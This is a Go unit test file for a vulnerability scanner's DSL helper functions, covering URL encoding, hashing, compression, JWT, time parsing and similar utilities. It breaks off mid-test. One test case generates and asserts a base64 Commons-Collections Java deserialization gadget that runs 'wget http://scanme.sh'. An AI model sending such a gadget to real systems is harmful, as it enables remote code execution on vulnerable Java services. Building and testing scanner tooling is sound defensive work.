package dsl

import (
	"fmt"
	"math"
	"os"
	"regexp"
	"testing"
	"time"

	"github.com/Knetic/govaluate"
	"github.com/stretchr/testify/require"
	"golang.org/x/exp/maps"
)

func TestIndex(t *testing.T) {
	index, err := govaluate.NewEvaluableExpressionWithFunctions("index(split(url, '.', -1), 1) == 'example'", DefaultHelperFunctions)
	require.Nil(t, err, "could not compile index")

	result, err := index.Evaluate(map[string]interface{}{"url": "https://www.example.com"})
	require.Nil(t, err, "could not evaluate index")
	require.Equal(t, true, result, "could not get index data")
}

func TestDSLURLEncodeDecode(t *testing.T) {
	t.Run("Standard encoding (default mode)", func(t *testing.T) {
		testCases := []struct {
			name     string
			input    string
			expected string
		}{
			{
				name:     "basic ascii",
				input:    "Hello World",
				expected: "Hello%20World",
			},
			{
				name:     "special characters",
				input:    "!@#$%^&*()_+",
				expected: "!%40%23%24%25%5E%26*()_%2B",
			},
			{
				name:     "query string characters",
				input:    "key=value&other=value?param=test",
				expected: "key%3Dvalue%26other%3Dvalue%3Fparam%3Dtest",
			},
			{
				name:     "path characters",
				input:    "/path/to/resource/",
				expected: "%2Fpath%2Fto%2Fresource%2F",
			},
			{
				name:     "unicode characters",
				input:    "こんにちは世界",
				expected: "%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF%E4%B8%96%E7%95%8C",
			},
			{
				name:     "emoji",
				input:    "🚀✨",
				expected: "%F0%9F%9A%80%E2%9C%A8",
			},
			{
				name:     "reserved characters that should be encoded",
				input:    ";,/?:@&=+$#",
				expected: "%3B%2C%2F%3F%3A%40%26%3D%2B%24%23",
			},
			{
				name:     "unreserved characters that should not be encoded",
				input:    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.!~*'()",
				expected: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.!~*'()",
			},
			{
				name:     "whitespace characters",
				input:    " \t\n\r",
				expected: "%20%09%0A%0D",
			},
			{
				name:     "std library encoding",
				input:    "&test\"",
				expected: "%26test%22",
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				encoded, err := DefaultHelperFunctions["url_encode"](tc.input)
				require.NoError(t, err, "url_encode should not error")
				require.Equal(t, tc.expected, encoded, "url_encode (standard mode) output should match expected")

				encoded, err = DefaultHelperFunctions["url_encode"](tc.input, false)
				require.NoError(t, err, "url_encode should not error with explicit false")
				require.Equal(t, tc.expected, encoded, "url_encode with explicit false should match expected")

				decoded, err := DefaultHelperFunctions["url_decode"](encoded)
				require.NoError(t, err, "url_decode should not error")
				require.Equal(t, tc.input, decoded, "url_decode should reverse url_encode")
			})
		}
	})

	t.Run("Encode all special characters (CyberChef mode)", func(t *testing.T) {
		testCases := []struct {
			name     string
			input    string
			expected string
		}{
			{
				name:     "basic ascii",
				input:    "Hello World",
				expected: "Hello%20World",
			},
			{
				name:     "special characters",
				input:    "!@#$%^&*()_+",
				expected: "%21%40%23%24%25%5E%26%2A%28%29%5F%2B",
			},
			{
				name:     "query string characters",
				input:    "key=value&other=value?param=test",
				expected: "key%3Dvalue%26other%3Dvalue%3Fparam%3Dtest",
			},
			{
				name:     "path characters",
				input:    "/path/to/resource/",
				expected: "%2Fpath%2Fto%2Fresource%2F",
			},
			{
				name:     "unicode characters",
				input:    "こんにちは世界",
				expected: "%E3%81%93%E3%82%93%E3%81%AB%E3%81%A1%E3%81%AF%E4%B8%96%E7%95%8C",
			},
			{
				name:     "emoji",
				input:    "🚀✨",
				expected: "%F0%9F%9A%80%E2%9C%A8",
			},
			{
				name:     "reserved characters that should be encoded",
				input:    ";,/?:@&=+$#",
				expected: "%3B%2C%2F%3F%3A%40%26%3D%2B%24%23",
			},
			{
				name:     "all special characters encoded",
				input:    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.!~*'()",
				expected: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789%2D%5F%2E%21%7E%2A%27%28%29",
			},
			{
				name:     "whitespace characters",
				input:    " \t\n\r",
				expected: "%20%09%0A%0D",
			},
		}

		for _, tc := range testCases {
			t.Run(tc.name, func(t *testing.T) {
				encoded, err := DefaultHelperFunctions["url_encode"](tc.input, true)
				require.NoError(t, err, "url_encode should not error with boolean true")
				require.Equal(t, tc.expected, encoded, "url_encode (encode all mode) output should match expected")

				encoded, err = DefaultHelperFunctions["url_encode"](tc.input, 1)
				require.NoError(t, err, "url_encode should not error with numeric 1")
				require.Equal(t, tc.expected, encoded, "url_encode with numeric 1 should match expected")

				decoded, err := DefaultHelperFunctions["url_decode"](encoded)
				require.NoError(t, err, "url_decode should not error")
				require.Equal(t, tc.input, decoded, "url_decode should reverse url_encode")
			})
		}
	})
}

func TestDSLTimeComparison(t *testing.T) {
	compiled, err := govaluate.NewEvaluableExpressionWithFunctions("unixtime() > not_after", DefaultHelperFunctions)
	require.Nil(t, err, "could not compare time")

	result, err := compiled.Evaluate(map[string]interface{}{"not_after": float64(time.Now().Unix() - 1000)})
	require.Nil(t, err, "could not evaluate compare time")
	require.Equal(t, true, result, "could not get url encoded data")
}

func TestDSLGzipSerialize(t *testing.T) {
	compiled, err := govaluate.NewEvaluableExpressionWithFunctions("gzip(\"hello world\")", DefaultHelperFunctions)
	require.Nil(t, err, "could not compile encoder")

	result, err := compiled.Evaluate(make(map[string]interface{}))
	require.Nil(t, err, "could not evaluate compare time")

	compiled, err = govaluate.NewEvaluableExpressionWithFunctions("gzip_decode(data)", DefaultHelperFunctions)
	require.Nil(t, err, "could not compile decoder")

	data, err := compiled.Evaluate(map[string]interface{}{"data": result})
	require.Nil(t, err, "could not evaluate decoded data")

	require.Equal(t, "hello world", data.(string), "could not get gzip encoded data")
}

func TestDslFunctionSignatures(t *testing.T) {
	createSignatureError := func(signature string) string {
		return fmt.Errorf("%w. correct method signature %q", ErrInvalidDslFunction, signature).Error()
	}

	errToUpperSignature := createSignatureError("to_upper(arg1 interface{}) interface{}")
	errRemoveBadCharsSignature := createSignatureError("remove_bad_chars(arg1, arg2 interface{}) interface{}")

	testCases := []struct {
		methodName string
		arguments  []interface{}
		expected   interface{}
		err        string
	}{
		{"to_upper", []interface{}{}, nil, errToUpperSignature},
		{"to_upper", []interface{}{"a"}, "A", ""},
		{"toupper", []interface{}{"a"}, "A", ""},
		{"to_upper", []interface{}{"a", "b", "c"}, nil, errToUpperSignature},

		{"remove_bad_chars", []interface{}{}, nil, errRemoveBadCharsSignature},
		{"remove_bad_chars", []interface{}{"a"}, nil, errRemoveBadCharsSignature},
		{"remove_bad_chars", []interface{}{"abba baab", "b"}, "aa aa", ""},
		{"remove_bad_chars", []interface{}{"a", "b", "c"}, nil, errRemoveBadCharsSignature},
	}

	helperFunctions := DefaultHelperFunctions
	for _, currentTestCase := range testCases {
		methodName := currentTestCase.methodName
		t.Run(methodName, func(t *testing.T) {
			actualResult, err := helperFunctions[methodName](currentTestCase.arguments...)

			if currentTestCase.err == "" {
				require.Nil(t, err)
			} else {
				require.Equal(t, err.Error(), currentTestCase.err)
			}
			require.Equal(t, currentTestCase.expected, actualResult)
		})
	}
}

func TestGetPrintableDslFunctionSignatures(t *testing.T) {
	expected := `	aes_cbc(arg1, arg2, arg3 interface{}) interface{}
	aes_gcm(arg1, arg2 interface{}) interface{}
	base64(arg1 interface{}) interface{}
	base64_decode(arg1 interface{}) interface{}
	base64_py(arg1 interface{}) interface{}
	bin_to_dec(arg1 interface{}) interface{}
	compare_versions(firstVersion, constraints ...string) bool
	concat(args ...interface{}) string
	contains(arg1, arg2 interface{}) interface{}
	contains_all(body interface{}, substrs ...string) bool
	contains_any(body interface{}, substrs ...string) bool
	cookie_unsign(s string) string
	count(str, substr string) int
	date_time(dateTimeFormat string, optionalUnixTime interface{}) string
	dec_to_hex(arg1 interface{}) interface{}
	deflate(arg1 interface{}) interface{}
	ends_with(str string, suffix ...string) bool
	equals_any(s interface{}, subs ...interface{}) bool
	generate_java_gadget(arg1, arg2, arg3 interface{}) interface{}
	generate_jwt(jsonString, algorithm, optionalSignature string, optionalMaxAgeUnix interface{}) string
	gzip(arg1 interface{}) interface{}
	gzip_decode(data string, optionalReadLimit int) string
	gzip_mtime(arg1 interface{}) interface{}
	hex_decode(arg1 interface{}) interface{}
	hex_encode(arg1 interface{}) interface{}
	hex_to_dec(arg1 interface{}) interface{}
	hmac(arg1, arg2, arg3 interface{}) interface{}
	html_escape(s string, optionalConvertAllChars bool) string
	html_unescape(arg1 interface{}) interface{}
	index(arg1, arg2 interface{}) interface{}
	inflate(data string, optionalReadLimit int) string
	ip_format(arg1, arg2 interface{}) interface{}
	jarm(arg1 interface{}) interface{}
	join(separator string, elements ...interface{}) string
	join(separator string, elements []interface{}) string
	json_minify(arg1 interface{}) interface{}
	json_prettify(arg1 interface{}) interface{}
	len(arg1 interface{}) interface{}
	line_ends_with(str string, suffix ...string) bool
	line_starts_with(str string, prefix ...string) bool
	llm_prompt(prompt string, optionalModel string) string
	md5(arg1 interface{}) interface{}
	mmh3(arg1 interface{}) interface{}
	oct_to_dec(arg1 interface{}) interface{}
	padding(arg1, arg2, arg3, arg4 interface{}) interface{}
	print_debug(args ...interface{})
	public_ip() string
	rand_base(length uint, optionalCharSet string) string
	rand_char(optionalCharSet string) string
	rand_int(optionalMin, optionalMax uint) int
	rand_ip(cidr ...string) string
	rand_text_alpha(length uint, optionalBadChars string) string
	rand_text_alphanumeric(length uint, optionalBadChars string) string
	rand_text_numeric(length uint, optionalBadNumbers string) string
	regex(arg1, arg2 interface{}) interface{}
	regex_all(pattern string, inputs ...string) bool
	regex_any(pattern string, inputs ...string) bool
	remove_bad_chars(arg1, arg2 interface{}) interface{}
	repeat(arg1, arg2 interface{}) interface{}
	replace(arg1, arg2, arg3 interface{}) interface{}
	replace_regex(arg1, arg2, arg3 interface{}) interface{}
	reverse(arg1 interface{}) interface{}
	rsa_encrypt(arg1, arg2 interface{}) interface{}
	sha1(arg1 interface{}) interface{}
	sha256(arg1 interface{}) interface{}
	sha512(arg1 interface{}) interface{}
	sort(elements ...interface{}) []interface{}
	sort(input number) string
	sort(input string) string
	split(input string, n int) []string
	split(input string, separator string, optionalChunkSize) []string
	starts_with(str string, prefix ...string) bool
	substr(str string, start int, optionalEnd int)
	to_lower(arg1 interface{}) interface{}
	to_number(arg1 interface{}) interface{}
	to_string(arg1 interface{}) interface{}
	to_title(s, optionalLang string) string
	to_unix_time(input string, optionalLayout string) int64
	to_upper(arg1 interface{}) interface{}
	trim(arg1, arg2 interface{}) interface{}
	trim_left(arg1, arg2 interface{}) interface{}
	trim_prefix(arg1, arg2 interface{}) interface{}
	trim_right(arg1, arg2 interface{}) interface{}
	trim_space(arg1 interface{}) interface{}
	trim_suffix(arg1, arg2 interface{}) interface{}
	uniq(elements ...interface{}) []interface{}
	uniq(input number) string
	uniq(input string) string
	unix_time(optionalSeconds uint) float64
	unpack(arg1, arg2 interface{}) interface{}
	url_decode(arg1 interface{}) interface{}
	url_encode(s string, optionalEncodeAllSpecialChars bool) string
	wait_for(seconds uint)
	xor(args ...interface{}) interface{}
	zip(file_entry string, content string, ... ) []byte
	zlib(arg1 interface{}) interface{}
	zlib_decode(data string, optionalReadLimit int) string
`

	signatures := GetPrintableDslFunctionSignatures(true)
	require.Equal(t, expected, signatures)

	coloredSignatures := GetPrintableDslFunctionSignatures(false)
	// nolint
	require.Contains(t, coloredSignatures, `[93maes_cbc[0m(arg1, arg2, arg3 [38;5;208minterface{}[0m)[38;5;208m interface{}[0m`, "could not get colored signatures")
}

func TestDslExpressions(t *testing.T) {
	dslExpressions := map[string]interface{}{
		`base64("Hello")`:                                "SGVsbG8=",
		`base64(1234)`:                                   "MTIzNA==",
		`base64_py("Hello")`:                             "SGVsbG8=\n",
		`hex_encode("aa")`:                               "6161",
		`html_escape("<body>test</body>")`:               "&lt;body&gt;test&lt;&sol;body&gt;",
		`html_escape("<body>test</body>", true)`:         "&lt;&#98;&#111;&#100;&#121;&gt;&#116;&#101;&#115;&#116;&lt;&sol;&#98;&#111;&#100;&#121;&gt;",
		`html_unescape("&lt;body&gt;test&lt;/body&gt;")`: "<body>test</body>",
		`html_unescape("&lt;&#98;&#111;&#100;&#121;&gt;&#116;&#101;&#115;&#116;&lt;&sol;&#98;&#111;&#100;&#121;&gt;")`:            "<body>test</body>",
		`html_unescape("&#x3c;&#x62;&#x6f;&#x64;&#x79;&#x3e;&#x74;&#x65;&#x73;&#x74;&#x3c;&#x2f;&#x62;&#x6f;&#x64;&#x79;&#x3e;")`: "<body>test</body>",
		`md5("Hello")`:                            "8b1a9953c4611296a827abf8c47804d7",
		`md5(1234)`:                               "81dc9bdb52d04dc20036dbd8313ed055",
		`mmh3("Hello")`:                           "316307400",
		`remove_bad_chars("abcd", "bc")`:          "ad",
		`replace("Hello", "He", "Ha")`:            "Hallo",
		`concat("Hello", 123, "world")`:           "Hello123world",
		`join("_", "Hello", 123, "world")`:        "Hello_123_world",
		`repeat("a", 5)`:                          "aaaaa",
		`repeat("a", "5")`:                        "aaaaa",
		`repeat("../", "5")`:                      "../../../../../",
		`repeat(5, 5)`:                            "55555",
		`replace_regex("He123llo", "(\\d+)", "")`: "Hello",
		`reverse("abc")`:                          "cba",
		`sha1("Hello")`:                           "f7ff9e8b7bb2e09b70935a5d785e0cc5d9d0abf0",
		`sha256("Hello")`:                         "185f8db32271fe25f561a6fc938b2e264306ec304eda518007d1764826381969",
		`sha512("Hello")`:                         "3615f80c9d293ed7402687f94b22d58e529b8cc7916f8fac7fddf7fbd5af4cf777d3d795a7a00a16bf7e7f3fb9561ee9baae480da9fe7a18769e71886b03f315",
		`to_lower("HELLO")`:                       "hello",
		`to_upper("hello")`:                       "HELLO",
		`trim("aaaHelloddd", "ad")`:               "Hello",
		`trim_left("aaaHelloddd", "ad")`:          "Helloddd",
		`trim_prefix("aaHelloaa", "aa")`:          "Helloaa",
		`trim_right("aaaHelloddd", "ad")`:         "aaaHello",
		`trim_space("  Hello  ")`:                 "Hello",
		`trim_suffix("aaHelloaa", "aa")`:          "aaHello",
		`url_decode("https:%2F%2Fprojectdiscovery.io%3Ftest=1")`: "https://projectdiscovery.io?test=1",
		`url_encode("https://projectdiscovery.io/test?a=1")`:     "https%3A%2F%2Fprojectdiscovery.io%2Ftest%3Fa%3D1",
		`gzip("Hello")`:         "\x1f\x8b\b\x00\x00\x00\x00\x00\x00\xff\xf2H\xcd\xc9\xc9\a\x04\x00\x00\xff\xff\x82\x89\xd1\xf7\x05\x00\x00\x00",
		`zip("aaa.txt","abcd")`: ([]byte("PK\x03\x04\x14\x00\x08\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00aaa.txtJLJN\x01\x04\x00\x00\xff\xffPK\x07\x08\x11\xcd\x82\xed\n\x00\x00\x00\x04\x00\x00\x00PK\x01\x02\x14\x00\x14\x00\x08\x00\x08\x00\x00\x00\x00\x00\x11\xcd\x82\xed\n\x00\x00\x00\x04\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00aaa.txtPK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x005\x00\x00\x00?\x00\x00\x00\x00\x00")),
		`zlib("Hello")`:         "\x78\x9c\xf2\x48\xcd\xc9\xc9\x07\x04\x00\x00\xff\xff\x05\x8c\x01\xf5",
		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"))`: "Hello",
		`deflate("Hello")`:                              "\xf2\x48\xcd\xc9\xc9\x07\x04\x00\x00\xff\xff",
		`inflate(hex_decode("f348cdc9c90700"))`:         "Hello",
		`inflate(hex_decode("f248cdc9c907040000ffff"))`: "Hello",
		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`: "Hello",
		`generate_java_gadget("commons-collections3.1", "wget http://scanme.sh", "base64")`:     "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAJmh0dHBzOi8vZ2l0aHViLmNvbS9qb2FvbWF0b3NmL2pleGJvc3Mgc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl%2BwoepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAFc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh%2Bj/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB%2BABtzcQB%2BABN1cQB%2BABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB%2BABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXIAE1tMamF2YS5sYW5nLlN0cmluZzut0lbn6R17RwIAAHhwAAAAAXQAFXdnZXQgaHR0cDovL3NjYW5tZS5zaHQABGV4ZWN1cQB%2BABsAAAABcQB%2BACBzcQB%2BAA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4",
		`generate_jwt("{\"name\":\"John Doe\",\"foo\":\"bar\"}", "HS256", "hello-world")`:       []byte("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmb28iOiJiYXIiLCJuYW1lIjoiSm9obiBEb2UifQ.EsrL8lIcYJR_Ns-JuhF3VCllCP7xwbpMCCfHin_WT6U"),
		`base64_decode("SGVsbG8=")`:                               "Hello",
		`hex_decode("6161")`:                                      "aa",
		`len("Hello")`:                                            float64(5),
		`len(1234)`:                                               float64(4),
		`len(split("1.2.3.4",'.',-1))`:                            float64(4),
		`contains("Hello", "lo")`:                                 true,
		`starts_with("Hello", "He")`:                              true,
		`ends_with("Hello", "lo")`:                                true,
		"line_starts_with('Hi\nHello', 'He')":                     true, // back quotes do not support escape sequences
		"line_ends_with('Hii\nHello', 'ii')":                      true, // back quotes do not support escape sequences
		`regex("H([a-z]+)o", "Hello")`:                            true,
		`wait_for(1)`:                                             nil,
		`padding("A","b",3,'suffix')`:                             "Abb",
		`padding("A","b",3,'prefix')`:                             "bbA",
		`print_debug(1+2, "Hello")`:                               nil,
		`to_number('4')`:                                          float64(4),
		`to_string(4)`:                                            "4",
		`dec_to_hex(7001)`:                                        "1b59",
		`hex_to_dec("ff")`:                                        float64(255),
		`hex_to_dec("0xff")`:                                      float64(255),
		`oct_to_dec("0o1234567")`:                                 float64(342391),
		`oct_to_dec("1234567")`:                                   float64(342391),
		`oct_to_dec(1234567)`:                                     float64(342391),
		`bin_to_dec("0b1010")`:                                    float64(10),
		`bin_to_dec("1010")`:                                      float64(10),
		`bin_to_dec(1010)`:                                        float64(10),
		`compare_versions('v1.0.0', '<1.1.1')`:                    true,
		`compare_versions('v1.1.1', '>v1.1.0')`:                   true,
		`compare_versions('v1.0.0', '>v0.0.1,<v1.0.1')`:           true,
		`compare_versions('v1.0.0', '>v0.0.1', '<v1.0.1')`:        true,
		`hmac('sha1', 'test', 'scrt')`:                            "8856b111056d946d5c6c92a21b43c233596623c6",
		`hmac('sha256', 'test', 'scrt')`:                          "1f1bff5574f18426eb376d6dd5368a754e67a798aa2074644d5e3fd4c90c7a92",
		`hmac('sha512', 'test', 'scrt')`:                          "1d3fff1dbb7369c1615ffb494813146bea051ce07e5d44bdeca539653ea97656bf9d38db264cddbe6a83ea15139c8f861a7e73e10e43ad4865e852a9ee6de2e9",
		`substr('xxtestxxx',2)`:                                   "testxxx",
		`substr('xxtestxxx',2,4)`:                                 "te",
		`substr('xxtestxxx',2,6)`:                                 "test",
		`sort(12453)`:                                             "12345",
		`sort("a1b2c3d4e5")`:                                      "12345abcde",
		`sort("b", "a", "2", "c", "3", "1", "d", "4")`:            []string{"1", "2", "3", "4", "a", "b", "c", "d"},
		`split("abcdefg", 2)`:                                     []string{"ab", "cd", "ef", "g"},
		`split("ab,cd,efg", ",", 1)`:                              []string{"ab,cd,efg"},
		`split("ab,cd,efg", ",", 2)`:                              []string{"ab", "cd,efg"},
		`split("ab,cd,efg", ",", "3")`:                            []string{"ab", "cd", "efg"},
		`split("ab,cd,efg", ",", -1)`:                             []string{"ab", "cd", "efg"},
		`split("ab,cd,efg", ",")`:                                 []string{"ab", "cd", "efg"},
		`join(" ", sort("b", "a", "2", "c", "3", "1", "d", "4"))`: "1 2 3 4 a b c d",
		`uniq(123123231)`:                                         "123",
		`uniq("abcabdaabbccd")`:                                   "abcd",
		`uniq("ab", "cd", "12", "34", "12", "cd")`:                []string{"ab", "cd", "12", "34"},
		`join(" ", uniq("ab", "cd", "12", "34", "12", "cd"))`:     "ab cd 12 34",
		`join(", ", split(hex_encode("abcdefg"), 2))`:             "61, 62, 63, 64, 65, 66, 67",
		`json_minify("{  \"name\":  \"John Doe\",   \"foo\":  \"bar\"     }")`:                       "{\"foo\":\"bar\",\"name\":\"John Doe\"}",
		`json_prettify("{\"foo\":\"bar\",\"name\":\"John Doe\"}")`:                                   "{\n    \"foo\": \"bar\",\n    \"name\": \"John Doe\"\n}",
		`ip_format('127.0.0.1', '1')`:                                                                "127.0.0.1",
		`ip_format('127.0.0.1', '3')`:                                                                "0177.0.0.01",
		`ip_format('127.0.0.1', '5')`:                                                                "2130706433",
		`ip_format('127.0.1.0', '11')`:                                                               "127.0.256",
		"unpack('>I', '\xac\xd7\t\xd0')":                                                             -272646673,
		"xor('\x01\x02', '\x02\x01')":                                                                []uint8([]byte{0x3, 0x3}),
		`count("projectdiscovery", "e")`:                                                             2,
		`concat(to_title("pRoJeCt"), to_title("diScOvErY"))`:                                         "ProjectDiscovery",
		`concat(to_title("welcome "), "to", to_title(" watch"), to_title("mojo"))`:                   "Welcome to WatchMojo",
		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"), 4)`:                           "Hell",
		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"), 4)`:   "Hell",
		`gzip_mtime(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"))`:       float64(0),
		`inflate(hex_decode("f248cdc9c907040000ffff"), 4)`:                                           "Hell",
		`zlib_decode(hex_decode("789cf248cdc9c907040000ffff058c01f5"), 100)`:                         "Hello",
		`gzip_decode(hex_decode("1f8b08000000000000fff248cdc9c907040000ffff8289d1f705000000"), 100)`: "Hello",
		`inflate(hex_decode("f248cdc9c907040000ffff"), 100)`:                                         "Hello",
		`rsa_encrypt("plaindata", "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtKqKDIZyXltCyLVym+VL
N4kMQHoazrJ7G5GbOSITuFaV0lpbXTw9VmW8wkyxG0U9b5zMaIfWyF5T9DWw/AcI
9ehszNYTy1U6KgNN94bZzILsWnQ3M7o8T9qZxITNBd/90VpW2O0ClR1z+gB4ls1C
cSy4ym0pQ7ZKMEJbWYxFuw3CJfWAFbdXcULgqIG0K7Nh++g6v5XLRceqxOW9j9Mc
29THVYk8uvF8gEOZBvM4RnhJhJX03ACRCHqBg4CdKaYaWIWc+eOxZrBg0iAfWpy+
vOZml6PnbXH+Z1+yVskAoyGKnOxRSaD0DJY6xq1x3z5AoVImLsCLSkJr2D+4W+EC
PQIDAQAB
-----END PUBLIC KEY-----") != ""`: true,
		`cookie_unsign("gAJ9cQFYCgAAAHRlc3Rjb29raWVxAlgGAAAAd29ya2VkcQNzLg:1mgnkC:z5yDxzI06qYVAU3bkLaWYpADT4I")`: "changeme",
	}

	testDslExpressions(t, dslExpressions)
}

func TestDateTimeDSLFunction(t *testing.T) {
	testDateTimeFormat := func(t *testing.T, dateTimeFormat string, dateTimeFunction *govaluate.EvaluableExpression, expectedFormattedTime string, currentUnixTime int64) {
		dslFunctionParameters := map[string]interface{}{"dateTimeFormat": dateTimeFormat}

		if currentUnixTime != 0 {
			dslFunctionParameters["unixTime"] = currentUnixTime
		}

		result, err := dateTimeFunction.Evaluate(dslFunctionParameters)

		require.Nil(t, err, "could not evaluate compare time")

		require.Equal(t, expectedFormattedTime, result.(string), "could not get correct time format string")
	}

	t.Run("with unix time", func(t *testing.T) {
		dateTimeFunction, err := govaluate.NewEvaluableExpressionWithFunctions("date_time(dateTimeFormat)", DefaultHelperFunctions)
		require.Nil(t, err, "could not compile encoder")

		currentTime := time.Now()
		expectedFormattedTime := currentTime.Format("02-01-2006 15:04")
		testDateTimeFormat(t, "02-01-2006 15:04", dateTimeFunction, expectedFormattedTime, 0)
		testDateTimeFormat(t, "%D-%M-%Y %H:%m", dateTimeFunction, expectedFormattedTime, 0)
	})

	t.Run("without unix time", func(t *testing.T) {
		dateTimeFunction, err := govaluate.NewEvaluableExpressionWithFunctions("date_time(dateTimeFormat, unixTime)", DefaultHelperFunctions)
		require.Nil(t, err, "could not compile encoder")

		currentTime := time.Now()
		currentUnixTime := currentTime.Unix()
		expectedFormattedTime := currentTime.Format("02-01-2006 15:04")
		testDateTimeFormat(t, "02-01-2006 15:04", dateTimeFunction, expectedFormattedTime, currentUnixTime)
		testDateTimeFormat(t, "%D-%M-%Y %H:%m", dateTimeFunction, expectedFormattedTime, currentUnixTime)
	})
}

func TestDateTimeDslExpressions(t *testing.T) {
	t.Run("date_time", func(t *testing.T) {
		now := time.Now()

		dslExpressions := map[string]interface{}{
			`date_time("%Y-%M-%D")`:                fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
			`date_time("%Y-%M-%D", unix_time())`:   fmt.Sprintf("%02d-%02d-%02d", now.Year(), now.Month(), now.Day()),
			`date_time("%Y-%M-%D", 1642032000)`:    time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("2006-01-02"),
			`date_time("%H-%m")`:                   fmt.Sprintf("%02d-%02d", now.Hour(), now.Minute()),
			`date_time("02-01-2006", unix_time())`: now.Format("02-01-2006"),
			`date_time("02-01-2006", 1642032000)`:  time.Date(2022, 01, 13, 0, 0, 0, 0, time.UTC).Local().Format("02-01-2006"),
		}

		testDslExpressions(t, dslExpressions)
	})

	t.Run("to_unix_time(input string) int", func(t *testing.T) {
		expectedUtcTime := time.Date(2022, 01, 13, 16, 30, 10, 0, time.UTC)

		dateTimeInputs := map[string]time.Time{
			// UTC time
			"2022-01-13T16:30:10Z":      expectedUtcTime,
			"2022-01-13T16:30:10+00:00": expectedUtcTime,
			"2022-01-13T16:30:10-00:00": expectedUtcTime,

			// explicit time offset
			"2022-01-13 16:30:10 +01:00": time.Date(2022, 01, 13, 16, 30, 10, 0, time.FixedZone("UTC+1", 60*60)),
			"2022-01-13 16:30 +01:00":    time.Date(2022, 01, 13, 16, 30, 0, 0, time.FixedZone("UTC+1", 60*60)),
			"2022-01-13 +02:00":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC+2", 2*60*60)),
			"2022-01-13 -02:00":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.FixedZone("UTC+2", -2*60*60)),

			// local time
			"2022-01-13 16:30:10": time.Date(2022, 01, 13, 16, 30, 10, 0, time.Local),
			"2022-01-13 16:30":    time.Date(2022, 01, 13, 16, 30, 0, 0, time.Local),
			"2022-01-13":          time.Date(2022, 01, 13, 0, 0, 0, 0, time.Local),
		}

		for dateTimeInput, expectedTime := range dateTimeInputs {
			dslExpression := fmt.Sprintf(`to_unix_time("%s")`, dateTimeInput)
